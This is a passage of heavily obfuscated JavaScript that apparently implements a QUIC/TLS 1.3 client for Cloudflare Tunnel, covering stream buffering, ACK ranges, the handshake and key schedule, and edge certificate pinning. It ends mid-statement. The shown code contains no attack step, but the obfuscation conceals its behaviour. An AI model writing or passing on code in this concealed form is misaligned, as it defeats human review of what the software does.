                this[jk(0xb0f)] = ![];
                continue;
            case '3':
                this[jk(0x426)] = Buffer[jk(0xacf)](0x0);
                continue;
            case '4':
                this[jk(0x19b)] = ![];
                continue;
            case '5':
                this[jk(0xd12)] = a;
                continue;
            case '6':
                this[jk(0xa97)] = 0x0;
                continue;
            }
            break;
        }
    }
    get [a0d0(0x97e)]() {
        const jl = a0d0;
        return this[jl(0x426)][jl(0x615)];
    }
    ['append'](a, b) {
        const jm = a0d0, c = {
                'YevuZ': function (d, f) {
                    return d - f;
                }
            };
        a[jm(0x615)] && (this['data'] = Buffer['concat']([
            this['data'],
            a
        ]), this['pending']['push']({
            'start': c[jm(0x35c)](this[jm(0x426)]['length'], a[jm(0x615)]),
            'length': a[jm(0x615)]
        })), b && (this['fin'] = !![], this[jm(0x19b)] = !![]);
    }
    [a0d0(0x548)](a) {
        const jn = a0d0, b = {
                'ggtOh': function (g, h) {
                    return g <= h;
                },
                'sNPkL': function (g, h) {
                    return g < h;
                }
            };
        if (!this[jn(0x339)]['length'] || b[jn(0x477)](a, 0x0))
            return null;
        const c = this[jn(0x339)][0x0], d = Math['min'](c['length'], a), f = {
                'start': c['start'],
                'length': d
            };
        return c['start'] += d, c['length'] -= d, !c[jn(0x615)] && this[jn(0x339)][jn(0x99b)](), f['bytes'] = this[jn(0x426)]['subarray'](f[jn(0xb58)], f['start'] + d), f[jn(0xc9a)] = b[jn(0x965)](f[jn(0xb58)], this[jn(0xa97)]), this[jn(0xa97)] = Math[jn(0x8b4)](this[jn(0xa97)], f[jn(0xb58)] + d), this[jn(0xd37)] = a0c8(this[jn(0xd37)], [{
                'start': f[jn(0xb58)],
                'length': d
            }]), f;
    }
    [a0d0(0x73b)]() {
        const jo = a0d0;
        if (!this[jo(0xb0f)] || !this[jo(0x19b)] || this[jo(0x339)][jo(0x615)] || this['unacked'][jo(0x615)])
            return ![];
        return this[jo(0x19b)] = ![], !![];
    }
    [a0d0(0xaca)](a, b, c) {
        const jp = a0d0, d = {
                'dIgRL': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'JfCTX': function (f, g) {
                    return f + g;
                },
                'yUmnz': function (f, g) {
                    return f >= g;
                },
                'vWCzi': function (f, g) {
                    return f + g;
                }
            };
        this[jp(0xd37)] = d['dIgRL'](a0c7, this[jp(0xd37)], a, d[jp(0xabc)](a, b)), c && this[jp(0xb0f)] && d['yUmnz'](d[jp(0x2d4)](a, b), this['data'][jp(0x615)]) && (this['finUnacked'] = ![]), this[jp(0xd12)][jp(0x312)]();
    }
    [a0d0(0xece)]() {
        const jq = a0d0, a = {
                'pojzV': function (b, c, d) {
                    return b(c, d);
                }
            };
        this['unacked'][jq(0x615)] && (this[jq(0xa97)] = this[jq(0xd37)][0x0][jq(0xb58)], this[jq(0x339)] = a[jq(0x717)](a0c8, this[jq(0x339)], this[jq(0xd37)])[jq(0xa25)]((c, d) => c[jq(0xb58)] - d['start']), this[jq(0xd37)] = []), this[jq(0xb0f)] && (this[jq(0x19b)] = !![]);
    }
    ['lossRanges'](a) {
        const jr = a0d0, b = {
                'EHYHt': function (c, d, f, g) {
                    return c(d, f, g);
                },
                'KyggA': function (c, d, f) {
                    return c(d, f);
                }
            };
        for (const c of a) {
            if (!c[jr(0x615)]) {
                c[jr(0xb0f)] && this[jr(0xb0f)] && (this[jr(0x19b)] = !![]);
                continue;
            }
            this[jr(0xd37)] = b[jr(0x669)](a0c7, this[jr(0xd37)], c[jr(0xb58)], c[jr(0xb58)] + c[jr(0x615)]), this[jr(0x339)] = b['KyggA'](a0c8, this[jr(0x339)], [{
                    'start': c[jr(0xb58)],
                    'length': c['length']
                }])['sort']((d, f) => d[jr(0xb58)] - f[jr(0xb58)]);
        }
    }
    ['idle']() {
        const js = a0d0;
        return !this[js(0x339)][js(0x615)] && !this['unacked'][js(0x615)] && !this['finUnacked'];
    }
}
class a0ca {
    constructor() {
        const jt = a0d0;
        this[jt(0x7da)] = 0x0, this[jt(0x339)] = [];
    }
    [a0d0(0x248)](a, b) {
        const ju = a0d0, c = {
                'MKfPu': function (f, g) {
                    return f + g;
                },
                'KXnXG': function (f, g) {
                    return f - g;
                },
                'ukBpW': function (f, g) {
                    return f >= g;
                },
                'FNsLb': function (f, g) {
                    return f !== g;
                },
                'CRamr': function (f, g) {
                    return f < g;
                },
                'jFidT': function (f, g) {
                    return f === g;
                }
            };
        if (a > c[ju(0x711)](this[ju(0x7da)], 0x100000))
            return Buffer['alloc'](0x0);
        if (a < this[ju(0x7da)]) {
            const f = c['KXnXG'](this['contiguous'], a);
            if (c[ju(0x488)](f, b[ju(0x615)]))
                return Buffer['alloc'](0x0);
            b = b[ju(0x3d1)](f), a = this[ju(0x7da)];
        }
        if (!b[ju(0x615)])
            return Buffer[ju(0xacf)](0x0);
        if (c[ju(0x419)](a, this['contiguous']))
            return this['pending']['push']({
                'start': a,
                'bytes': Buffer['from'](b)
            }), Buffer[ju(0xacf)](0x0);
        const d = [b];
        this['contiguous'] += b[ju(0x615)];
        for (let g = !![]; g;) {
            g = ![];
            for (let h = 0x0; c['CRamr'](h, this['pending'][ju(0x615)]); h++) {
                if (c[ju(0xb0e)](this[ju(0x339)][h]['start'], this['contiguous'])) {
                    d[ju(0x59a)](this[ju(0x339)][h][ju(0xf2c)]), this[ju(0x7da)] += this[ju(0x339)][h][ju(0xf2c)][ju(0x615)], this[ju(0x339)][ju(0x918)](h, 0x1), g = !![];
                    break;
                }
            }
        }
        return Buffer[ju(0x7b6)](d);
    }
}
function a0cb(a, b, c, d) {
    const jv = a0d0, f = {
            'qFsnI': function (j, k) {
                return j < k;
            },
            'WRIMH': function (j, k) {
                return j + k;
            },
            'XvjSM': function (j, k) {
                return j + k;
            },
            'FEubH': function (j, k) {
                return j + k;
            },
            'sFqSe': function (j, k) {
                return j & k;
            },
            'HIquo': function (j, k) {
                return j < k;
            }
        };
    if (f[jv(0x5d9)](b[jv(0x615)], f['WRIMH'](c, 0x4) + a0bM))
        return null;
    const g = a['mask'](b[jv(0x3d1)](f[jv(0x7f4)](c, 0x4), f[jv(0xd51)](f[jv(0xa69)](c, 0x4), a0bM))), h = Buffer[jv(0x58d)](b);
    h[0x0] ^= f[jv(0x5d3)](g[0x0], d ? 0xf : 0x1f);
    for (let j = 0x0; f[jv(0xa34)](j, a0bN); j++) {
        h[c + j] ^= g[f[jv(0x7f4)](0x1, j)];
    }
    return h;
}
function a0cc(a, b, c, d) {
    const jw = a0d0, f = {
            'oIMUS': function (l, m) {
                return l < m;
            },
            'IaeGs': function (l, m) {
                return l + m;
            },
            'HLNUv': function (l, m) {
                return l + m;
            },
            'OVGey': function (l, m) {
                return l + m;
            },
            'Fhzif': function (l, m) {
                return l & m;
            },
            'oLOhw': function (l, m) {
                return l + m;
            },
            'ezTiK': function (l, m) {
                return l < m;
            },
            'niZzW': function (l, m) {
                return l + m;
            },
            'AfMug': function (l, m) {
                return l < m;
            },
            'SVwRY': function (l, m) {
                return l * m;
            },
            'KJTfL': function (l, m) {
                return l + m;
            },
            'UHNtE': function (l, m) {
                return l + m;
            }
        };
    if (f['oIMUS'](b['length'], f['IaeGs'](f['HLNUv'](c, 0x4), a0bM)))
        return null;
    const g = a[jw(0xf1d)](b[jw(0x3d1)](f[jw(0xbb2)](c, 0x4), f[jw(0x1ba)](c, 0x4) + a0bM)), h = Buffer[jw(0x58d)](b);
    h[0x0] ^= f[jw(0x4a9)](g[0x0], d ? 0xf : 0x1f);
    const j = f[jw(0xb1f)](f[jw(0x4a9)](h[0x0], 0x3), 0x1);
    for (let l = 0x0; f[jw(0x468)](l, j); l++) {
        h[f['IaeGs'](c, l)] ^= g[f[jw(0x2f4)](0x1, l)];
    }
    let k = 0x0;
    for (let m = 0x0; f[jw(0x50a)](m, j); m++) {
        k = f[jw(0x1ba)](f[jw(0xa29)](k, 0x100), h[f[jw(0xe66)](c, m)]);
    }
    return [
        h['subarray'](0x0, f[jw(0x8c7)](c, j)),
        k
    ];
}
function a0cd(a, b, c) {
    const jx = a0d0, d = {
            'wcdyc': function (j, k) {
                return j + k;
            },
            'bXtyb': function (j, k) {
                return j - k;
            },
            'kJzZR': function (j, k) {
                return j << k;
            },
            'wuuDF': function (j, k) {
                return j(k);
            },
            'oudUX': function (j, k) {
                return j | k;
            },
            'hlprx': function (j, k) {
                return j & k;
            },
            'zVMEc': function (j, k) {
                return j << k;
            },
            'WroaD': function (j, k) {
                return j(k);
            },
            'yYYtM': function (j, k) {
                return j - k;
            },
            'MkqIq': function (j, k) {
                return j <= k;
            },
            'GIPOg': function (j, k) {
                return j(k);
            },
            'bLJSa': function (j, k) {
                return j > k;
            },
            'XjdXh': function (j, k) {
                return j >= k;
            },
            'ZwRSL': function (j, k) {
                return j(k);
            }
        }, f = d['wcdyc'](BigInt(a), 0x1n), g = d[jx(0x10c)](d[jx(0xde8)](0x1n, d['wuuDF'](BigInt, b)), 0x1n);
    let h = d['oudUX'](d[jx(0xa14)](f, ~g), BigInt(c));
    const i = d[jx(0xb63)](0x1n, d[jx(0xed9)](BigInt, d[jx(0xd26)](b, 0x1)));
    if (d[jx(0x9b0)](h + i, f))
        h += 0x1n << d[jx(0x3f1)](BigInt, b);
    else
        d['bLJSa'](h, f + i) && d[jx(0xd7d)](h, 0x1n << BigInt(b)) && (h -= d['zVMEc'](0x1n, d['GIPOg'](BigInt, b)));
    return d[jx(0x367)](Number, h);
}
function a0ce(a) {
    const jy = a0d0, b = {
            'GjHhY': function (j, k) {
                return j - k;
            },
            'zYzmt': function (j, k) {
                return j >= k;
            },
            'vWrki': function (j, k) {
                return j + k;
            },
            'HqXkV': function (j, k) {
                return j - k;
            }
        }, c = new a0bZ();
    c[jy(0xc43)](a0bU[jy(0xaca)]);
    const d = a[jy(0x174)]()[jy(0xa25)]((j, k) => j[jy(0xb58)] - k[jy(0xb58)]), f = d[d['length'] - 0x1], g = f[jy(0xb58)] + f[jy(0x615)] - 0x1;
    c[jy(0xb61)](g), c[jy(0xb61)](0x0), c[jy(0xb61)](b[jy(0x22b)](d['length'], 0x1)), c[jy(0xb61)](g - f[jy(0xb58)]);
    let h = f[jy(0xb58)];
    for (let j = d[jy(0x615)] - 0x2; b[jy(0x289)](j, 0x0); j--) {
        const k = d[j], l = b[jy(0xb87)](k['start'], k[jy(0x615)]) - 0x1;
        c['varint'](b[jy(0x894)](h, l) - 0x2), c[jy(0xb61)](l - k['start']), h = k[jy(0xb58)];
    }
    return c[jy(0x796)]();
}
function a0cf(a) {
    const jz = a0d0, b = {
            'DDghe': function (k, l) {
                return k - l;
            },
            'QYrcO': function (k, l) {
                return k + l;
            },
            'wbrEL': function (k, l) {
                return k - l;
            },
            'pukGZ': function (k, l) {
                return k < l;
            },
            'pVzyD': function (k, l) {
                return k - l;
            },
            'bSvTn': function (k, l) {
                return k - l;
            },
            'ufIYJ': function (k, l) {
                return k / l;
            }
        }, c = a[jz(0x5f6)](), d = a[jz(0x5f6)](), f = a[jz(0x5f6)](), g = a[jz(0x5f6)](), h = [{
                'start': b[jz(0x824)](c, g),
                'length': b[jz(0x165)](g, 0x1)
            }];
    let j = b[jz(0x2f8)](c, g);
    for (let k = 0x0; b['pukGZ'](k, f); k++) {
        const l = a[jz(0x5f6)](), m = a[jz(0x5f6)](), n = b['pVzyD'](b[jz(0x824)](j, l), 0x2);
        h[jz(0x59a)]({
            'start': b[jz(0x3e6)](n, m),
            'length': m + 0x1
        }), j = b['pVzyD'](n, m);
    }
    return h[jz(0x633)] = b[jz(0x9da)](d, 0x3e8), h;
}
function a0cg(a) {
    const jA = a0d0, b = {
            'sLKqg': function (f, g) {
                return f > g;
            },
            'MFohR': function (f, g) {
                return f(g);
            },
            'uskTX': function (f, g) {
                return f < g;
            },
            'HCUTS': function (f, g) {
                return f === g;
            },
            'kNhfd': function (f, g) {
                return f === g;
            },
            'FKBEc': function (f, g) {
                return f + g;
            },
            'pbzki': function (f, g) {
                return f * g;
            }
        }, c = {}, d = new a0c0(a);
    while (b[jA(0x3ea)](d['remaining'], 0x0)) {
        const f = b[jA(0x58b)](Number, d[jA(0xb61)]()), g = d[jA(0x5f6)]();
        if (b[jA(0x129)](d[jA(0x68e)], g))
            break;
        const h = d[jA(0xf2c)](g);
        if (b[jA(0xb44)](h[jA(0x615)], 0x1) || h['length'] === 0x2 || b[jA(0xb44)](h[jA(0x615)], 0x4) || b['kNhfd'](h[jA(0x615)], 0x8)) {
            let i = 0x0;
            for (const j of h) {
                i = b[jA(0xede)](b[jA(0x887)](i, 0x100), j);
            }
            c[f] = i;
        } else
            c[f] = Buffer[jA(0x58d)](h);
    }
    return c;
}
function a0ch(a) {
    const jB = a0d0, b = {
            'ozunt': function (d, f) {
                return d === f;
            },
            'ZMWhS': function (d, f) {
                return d(f);
            }
        }, c = new a0bZ();
    for (const [d, f] of a) {
        let g;
        if (Buffer[jB(0x55b)](f))
            g = f;
        else
            b[jB(0xd7c)](f, !![]) ? g = Buffer['alloc'](0x0) : g = b[jB(0xd65)](a0bX, f);
        c[jB(0xb61)](d), c['varint'](g[jB(0x615)]), c['bytes'](g);
    }
    return c['build']();
}
function a0ci(a, b) {
    const jC = a0d0, c = Buffer[jC(0xacf)](0x4);
    return c[0x0] = a, c[jC(0x714)](b[jC(0x615)], 0x1, 0x3), Buffer[jC(0x7b6)]([
        c,
        b
    ]);
}
function a0cj(a, b) {
    const jD = a0d0, c = Buffer[jD(0xacf)](0x4);
    return c['writeUInt16BE'](a, 0x0), c['writeUInt16BE'](b[jD(0x615)], 0x2), Buffer[jD(0x7b6)]([
        c,
        b
    ]);
}
class a0ck {
    constructor(a, b, c) {
        const jE = a0d0, d = {
                'aCKgs': '1|7|5|6|4|10|12|11|8|2|0|9|3',
                'aizCI': jE(0xb58),
                'SeZYm': 'spki',
                'BEBza': jE(0x979),
                'UTTib': 'x25519',
                'uCIbX': jE(0x904),
                'SrfBU': 'aes-128-gcm'
            }, f = d[jE(0x576)][jE(0xc0)]('|');
        let g = 0x0;
        while (!![]) {
            switch (f[g++]) {
            case '0':
                this['remoteParameters'] = null;
                continue;
            case '1':
                this[jE(0xafd)] = a;
                continue;
            case '2':
                this[jE(0xb3d)] = d[jE(0x291)];
                continue;
            case '3':
                this[jE(0xa4d)] = null;
                continue;
            case '4':
                this[jE(0xae2)] = this[jE(0xc10)][jE(0xae2)][jE(0xdb1)]({
                    'type': d[jE(0x860)],
                    'format': d[jE(0xc8)]
                })[jE(0x3d1)](-0x20);
                continue;
            case '5':
                this[jE(0xdea)] = c;
                continue;
            case '6':
                this[jE(0xc10)] = a0k['generateKeyPairSync'](d[jE(0x6ab)]);
                continue;
            case '7':
                this['alpn'] = b;
                continue;
            case '8':
                this[jE(0xea2)] = [];
                continue;
            case '9':
                this[jE(0x884)] = null;
                continue;
            case '10':
                this[jE(0x678)] = d[jE(0xb4c)];
                continue;
            case '11':
                this[jE(0x4a5)] = d[jE(0x1ea)];
                continue;
            case '12':
                this[jE(0xaff)] = 0x20;
                continue;
            }
            break;
        }
    }
    [a0d0(0x65a)](a) {
        const jF = a0d0, b = {
                'FTIKp': function (f, g) {
                    return f === g;
                }
            }, c = a0k['createHash'](this['hash']), d = b['FTIKp'](a, undefined) ? this[jF(0xea2)] : this['messages']['slice'](0x0, a);
        for (const f of d) {
            c[jF(0xaf5)](f);
        }
        return c['digest']();
    }
    [a0d0(0xd63)]() {
        const jG = a0d0, a = {
                'pRhow': jG(0x132),
                'icElG': function (p, q) {
                    return p + q;
                },
                'KOgcT': function (p, q, r) {
                    return p(q, r);
                },
                'HNoLh': function (p, q, r) {
                    return p(q, r);
                },
                'nNPxW': function (p, q, r) {
                    return p(q, r);
                },
                'kwjFy': function (p, q, r) {
                    return p(q, r);
                },
                'WOVOh': function (p, q) {
                    return p >> q;
                },
                'slhHt': function (p, q) {
                    return p & q;
                },
                'XhYBZ': function (p, q, r) {
                    return p(q, r);
                },
                'BpVpu': jG(0x2cf)
            }, b = Buffer[jG(0x58d)](this[jG(0xafd)], a[jG(0xe9)]), c = new a0bZ()[jG(0xe5f)](a[jG(0x148)](b[jG(0x615)], 0x3))[jG(0xc43)](0x0)[jG(0xe5f)](b[jG(0x615)])[jG(0xf2c)](b)['build'](), d = new a0bZ()[jG(0xe5f)](0x4)[jG(0xe5f)](0x1d)['u16'](0x17)['build'](), f = new a0bZ()[jG(0xe5f)](0x8)[jG(0xe5f)](0x403)[jG(0xe5f)](0x804)['u16'](0x401)['u16'](0x807)[jG(0x796)](), g = new a0bZ()[jG(0xc43)](0x2)[jG(0xe5f)](0x304)['build'](), h = new a0bZ()[jG(0xe5f)](0x4 + this[jG(0xae2)][jG(0x615)])[jG(0xe5f)](0x1d)[jG(0xe5f)](this['publicKey'][jG(0x615)])['bytes'](this[jG(0xae2)])[jG(0x796)](), i = Buffer['concat']([
                Buffer['from']([this[jG(0xf23)][jG(0x615)]]),
                Buffer[jG(0x58d)](this['alpn'], jG(0x132))
            ]), j = new a0bZ()['u16'](i['length'])[jG(0xf2c)](i)[jG(0x796)](), k = new a0bZ()[jG(0xc43)](0x1)[jG(0xc43)](0x1)[jG(0x796)](), l = Buffer[jG(0x7b6)]([
                a[jG(0xc11)](a0cj, 0x0, c),
                a[jG(0xc11)](a0cj, 0xa, d),
                a[jG(0xc11)](a0cj, 0xd, f),
                a0cj(0x2b, g),
                a[jG(0xc55)](a0cj, 0x33, h),
                a['nNPxW'](a0cj, 0x10, j),
                a[jG(0xdb5)](a0cj, 0x2d, k),
                a['HNoLh'](a0cj, 0xff01, Buffer[jG(0x58d)]([0x0])),
                a[jG(0xe25)](a0cj, 0x39, this[jG(0xdea)])
            ]), m = Buffer[jG(0x58d)]([
                0x0,
                0x4,
                0x13,
                0x1,
                0x13,
                0x2
            ]), n = Buffer[jG(0x7b6)]([
                Buffer['from']([
                    0x3,
                    0x3
                ]),
                a0k['randomBytes'](0x20),
                Buffer['from']([0x0]),
                m,
                Buffer[jG(0x58d)]([
                    0x1,
                    0x0
                ]),
                Buffer['from']([
                    a[jG(0xc5c)](l[jG(0x615)], 0x8) & 0xff,
                    a[jG(0x2e2)](l[jG(0x615)], 0xff)
                ]),
                l
            ]), o = a['XhYBZ'](a0ci, 0x1, n);
        return this[jG(0xea2)][jG(0x59a)](o), this[jG(0xb3d)] = a[jG(0x8b8)], o;
    }
    [a0d0(0x8dc)](a) {
        const jH = a0d0, b = {
                'Erzqv': function (d, f) {
                    return d < f;
                },
                'HNFaQ': function (d, f) {
                    return d !== f;
                },
                'yFECx': jH(0x218),
                'mpsxM': function (d, f) {
                    return d + f;
                },
                'bBSll': function (d, f) {
                    return d + f;
                }
            };
        if (b[jH(0xaf9)](a[jH(0x615)], 0x4))
            return null;
        if (b[jH(0x217)](a[0x0], 0x2))
            throw new Error(b[jH(0x343)]);
        const c = a[jH(0xd7)](0x1, 0x3);
        if (a[jH(0x615)] < b['mpsxM'](0x4, c))
            return null;
        return a[jH(0x3d1)](0x0, b[jH(0xab1)](0x4, c));
    }
    ['handleServerHello'](a) {
        const jI = a0d0, b = {
                'oJfcn': 'edge\x20requested\x20a\x20HelloRetryRequest,\x20which\x20is\x20not\x20supported',
                'qskRJ': function (q, r) {
                    return q >= r;
                },
                'HkABI': function (q, r) {
                    return q === r;
                },
                'fCcmg': function (q, r) {
                    return q === r;
                },
                'RaNGU': function (q, r) {
                    return q !== r;
                },
                'sYBWj': jI(0xedc),
                'wYMvC': function (q, r) {
                    return q === r;
                },
                'swyRh': 'edge\x20selected\x20unsupported\x20key\x20share\x20group\x20',
                'IBxcr': jI(0x904),
                'ASZvy': 'aes-128-gcm',
                'hpDcx': function (q, r) {
                    return q === r;
                },
                'jWKsx': 'sha384',
                'RazsZ': jI(0xb0),
                'StdhR': function (q, r) {
                    return q + r;
                },
                'BPvMh': 'der',
                'YZJTK': 'spki',
                'KyEDc': function (q, r, s, t) {
                    return q(r, s, t);
                },
                'qLeGa': function (q, r, s, t, u, v) {
                    return q(r, s, t, u, v);
                },
                'aMEvi': jI(0x277),
                'PFNpX': function (q, r, s, t, u, v) {
                    return q(r, s, t, u, v);
                },
                'IpzjZ': jI(0x994),
                'Asuqu': jI(0x197),
                'enmRi': jI(0x3a2)
            }, c = new a0c0(a[jI(0x3d1)](0x4));
        c['u16']();
        const d = c[jI(0xf2c)](0x20);
        if (d[jI(0xa7)](a0bL))
            throw new Error(b[jI(0xef2)]);
        const f = c[jI(0xf2c)](c[jI(0xc43)]()), g = c[jI(0xe5f)]();
        c[jI(0xc43)]();
        let h = null;
        const i = c['u16']();
        let j = 0x0;
        while (j < i && b[jI(0x2d2)](c['remaining'], 0x4)) {
            const q = c[jI(0xe5f)](), r = c['u16'](), s = c[jI(0xf2c)](r);
            j += 0x1;
            if (b[jI(0x7ee)](q, 0x33) && b[jI(0x2d2)](s[jI(0x615)], 0x4)) {
                const t = new a0c0(s), u = t['u16'](), v = t[jI(0xe5f)]();
                h = {
                    'group': u,
                    'key': t[jI(0xf2c)](v)
                };
            } else {
                if (b['fCcmg'](q, 0x2b) && s['length'] >= 0x2) {
                    if (b[jI(0x3b7)](s[jI(0x93d)](0x0), 0x304))
                        throw new Error(b[jI(0xc27)]);
                }
            }
        }
        if (b[jI(0xcb0)](h, null))
            throw new Error(jI(0x792));
        if (h[jI(0x263)] !== 0x1d)
            throw new Error(b[jI(0x139)] + h[jI(0x263)]);
        if (g === 0x1301)
            this['hash'] = b[jI(0xbe0)], this[jI(0xaff)] = 0x20, this[jI(0x4a5)] = b[jI(0xb5a)];
        else {
            if (b[jI(0x4ed)](g, 0x1302))
                this[jI(0x678)] = b['jWKsx'], this[jI(0xaff)] = 0x30, this[jI(0x4a5)] = b[jI(0x700)];
            else
                throw new Error(b[jI(0xb55)](jI(0xbcb), g[jI(0xa27)](0x10)));
        }
        this['messages'][jI(0x59a)](a);
        const k = a0k[jI(0xef9)]({
                'key': Buffer[jI(0x7b6)]([
                    Buffer['from'](jI(0x41b), jI(0xaef)),
                    h[jI(0xd79)]
                ]),
                'format': b[jI(0x2aa)],
                'type': b[jI(0xbc5)]
            }), l = a0k['diffieHellman']({
                'privateKey': this[jI(0xc10)][jI(0x251)],
                'publicKey': k
            }), m = Buffer[jI(0xacf)](this[jI(0xaff)]), n = b[jI(0x484)](a0c1, this[jI(0x678)], m, m), o = b[jI(0x66a)](a0c3, this[jI(0x678)], n, b[jI(0x4f2)], a0k['createHash'](this['hash'])[jI(0x40b)](), this[jI(0xaff)]);
        this[jI(0x579)] = b['KyEDc'](a0c1, this[jI(0x678)], o, l);
        const p = this['transcript']();
        return this[jI(0x3e0)] = b[jI(0x449)](a0c3, this['hash'], this[jI(0x579)], b[jI(0xe85)], p, this[jI(0xaff)]), this[jI(0x147)] = b['PFNpX'](a0c3, this[jI(0x678)], this[jI(0x579)], b[jI(0x2b6)], p, this['hashLength']), this['state'] = b[jI(0xcac)], {
            'send': new a0c4(this['hash'], this[jI(0x4a5)], this[jI(0x3e0)]),
            'recv': new a0c4(this[jI(0x678)], this['cipher'], this[jI(0x147)])
        };
    }
    [a0d0(0xf29)](a) {
        const jJ = a0d0, b = {
                'lDMhg': function (u, v) {
                    return u === v;
                },
                'XTqUn': function (u, v) {
                    return u >= v;
                },
                'xJnAk': function (u, v) {
                    return u === v;
                },
                'kyCIM': jJ(0x132),
                'xSrdk': function (u, v) {
                    return u === v;
                },
                'KchsW': function (u, v) {
                    return u + v;
                },
                'PuNQr': function (u, v) {
                    return u <= v;
                },
                'wJLVA': function (u, v) {
                    return u + v;
                },
                'xHKsf': function (u, v) {
                    return u >= v;
                },
                'SLNrL': function (u, v) {
                    return u > v;
                },
                'GfysI': function (u, v) {
                    return u + v;
                },
                'JqEwB': function (u, v) {
                    return u + v;
                },
                'KtRul': function (u, v) {
                    return u === v;
                },
                'eegVh': function (u, v) {
                    return u === v;
                },
                'YzlFu': function (u, v) {
                    return u !== v;
                },
                'gMEEv': function (u, v) {
                    return u - v;
                },
                'sFRdR': function (u, v, w, x, y, z) {
                    return u(v, w, x, y, z);
                },
                'NsbLf': jJ(0x591),
                'krEyS': function (u, v, w) {
                    return u(v, w);
                },
                'AcnuG': jJ(0x277),
                'AEHCE': function (u, v, w, x) {
                    return u(v, w, x);
                },
                'XDIQX': jJ(0x880),
                'PPnlW': 's\x20ap\x20traffic'
            };
        this[jJ(0xea2)][jJ(0x59a)](a);
        const c = a[0x0];
        if (b[jJ(0xe06)](c, 0x8)) {
            const u = new a0c0(a[jJ(0x3d1)](0x4)), v = u['u16']();
            let w = 0x0;
            while (w < v && b[jJ(0xb0c)](u[jJ(0x68e)], 0x4)) {
                const x = u[jJ(0xe5f)](), y = u[jJ(0xe5f)](), z = u['bytes'](y);
                w += 0x1;
                if (b[jJ(0x1be)](x, 0x39))
                    this[jJ(0xa84)] = a0cg(Buffer[jJ(0x58d)](z));
                else
                    b[jJ(0x1be)](x, 0x10) && z[jJ(0x615)] >= 0x3 && (this[jJ(0x884)] = z['subarray'](0x3)[jJ(0xa27)](b[jJ(0x960)]));
            }
            return null;
        }
        if (b[jJ(0x949)](c, 0xb)) {
            const A = a[jJ(0x3d1)](0x4);
            if (A[jJ(0x615)] >= 0x4) {
                const B = b['KchsW'](0x1, A[0x0]);
                if (b[jJ(0xc79)](B, 0x3) <= A[jJ(0x615)]) {
                    const C = A[jJ(0xd7)](B, 0x3);
                    if (b[jJ(0xab6)](b[jJ(0x3eb)](B, 0x3) + C, A[jJ(0x615)]) && b['xHKsf'](C, 0x3)) {
                        const D = A['readUIntBE'](b['KchsW'](B, 0x3), 0x3);
                        b['SLNrL'](D, 0x0) && b[jJ(0x84b)](b['wJLVA'](B, 0x6), D) <= A[jJ(0x615)] && (this[jJ(0xa4d)] = Buffer[jJ(0x58d)](A[jJ(0x3d1)](B + 0x6, b[jJ(0x6e4)](B + 0x6, D))));
                    }
                }
            }
            return null;
        }
        if (b[jJ(0xcdd)](c, 0xf) || b['eegVh'](c, 0x4))
            return null;
        if (b[jJ(0x988)](c, 0x14))
            return null;
        const d = this['messages'][b[jJ(0x206)](this[jJ(0xea2)][jJ(0x615)], 0x1)], f = d['subarray'](0x4), g = this[jJ(0x65a)](this[jJ(0xea2)][jJ(0x615)] - 0x1), h = b['sFRdR'](a0c3, this[jJ(0x678)], this[jJ(0x147)], b['NsbLf'], Buffer['alloc'](0x0), this[jJ(0xaff)]), i = a0k['createHmac'](this['hash'], h)[jJ(0xaf5)](g)[jJ(0x40b)](), j = b[jJ(0x88a)](i[jJ(0x615)], f[jJ(0x615)]) && a0k[jJ(0x5d4)](i, f), k = b[jJ(0xd84)](a0c3, this['hash'], this[jJ(0x3e0)], 'finished', Buffer[jJ(0xacf)](0x0), this['hashLength']), l = this[jJ(0x65a)](), m = a0k[jJ(0xd10)](this[jJ(0x678)], k)['update'](l)[jJ(0x40b)](), n = b[jJ(0x3b8)](a0ci, 0x14, m), o = Buffer[jJ(0xacf)](this['hashLength']), p = b[jJ(0xd84)](a0c3, this['hash'], this[jJ(0x579)], b[jJ(0x33c)], a0k[jJ(0xb88)](this[jJ(0x678)])[jJ(0x40b)](), this[jJ(0xaff)]), q = b[jJ(0xdd5)](a0c1, this['hash'], p, o), r = this[jJ(0x65a)]();
        this[jJ(0xea2)][jJ(0x59a)](n);
        const s = b[jJ(0xd84)](a0c3, this['hash'], q, b[jJ(0x2b1)], r, this[jJ(0xaff)]), t = b[jJ(0xd84)](a0c3, this['hash'], q, b['PPnlW'], r, this['hashLength']);
        return this[jJ(0xb3d)] = 'complete', {
            'verified': j,
            'finished': n,
            'send': new a0c4(this['hash'], this[jJ(0x4a5)], s),
            'recv': new a0c4(this['hash'], this[jJ(0x4a5)], t)
        };
    }
}
function a0cl(a) {
    const jK = a0d0, b = {
            'XTCuK': function (k, l) {
                return k === l;
            },
            'gNZrM': function (k, l) {
                return k + l;
            },
            'VAoAf': 'unreadable\x20edge\x20certificate:\x20',
            'FpDnp': function (k, l) {
                return k(l);
            },
            'TDTMt': function (k, l) {
                return k(l);
            },
            'AMvPD': function (k, l) {
                return k + l;
            },
            'rwziK': jK(0x89a),
            'PQjmf': 'issuer\x20OU\x20mismatch:\x20',
            'mbZte': jK(0xa6b),
            'FeiIv': 'quic.cftunnel.com',
            'kglWr': function (k, l) {
                return k + l;
            },
            'VItYP': 'SAN\x20does\x20not\x20cover\x20quic.cftunnel.com\x20(SAN=',
            'ashFU': function (k, l) {
                return k(l);
            }
        };
    if (!a || !a['length'])
        return 'no\x20edge\x20certificate\x20in\x20TLS\x20handshake';
    let c;
    try {
        c = new a0k['X509Certificate'](a);
    } catch (k) {
        return b[jK(0x997)](b['VAoAf'], k[jK(0xf18)]);
    }
    const d = l => String(l || '')['replace'](/\\,/g, ','), f = b[jK(0xc6c)](d, c[jK(0x3e5)]), g = b['TDTMt'](d, c['subject']);
    if (!f[jK(0xd32)](jK(0x6e9)))
        return b[jK(0xe6)](b[jK(0x4ae)], f);
    if (!f['includes']('OU=CloudFlare\x20Origin\x20SSL'))
        return b[jK(0x9d0)] + f;
    if (!g['includes'](b['mbZte']))
        return b[jK(0x997)](jK(0xccf), g);
    const h = b[jK(0xc6c)](String, c[jK(0x410)] || '')[jK(0xc0)](',')[jK(0x9c5)](l => l[jK(0x27f)]()[jK(0x777)]()), i = b['FeiIv'], j = h[jK(0x696)](l => {
            const jL = jK;
            if (!l['startsWith'](jL(0xab0)))
                return ![];
            const m = l[jL(0x174)](0x4);
            return b[jL(0xd54)](m, i) || m === jL(0x8ab) || m['startsWith']('*.') && i[jL(0x361)](m[jL(0x174)](0x1));
        });
    if (!j)
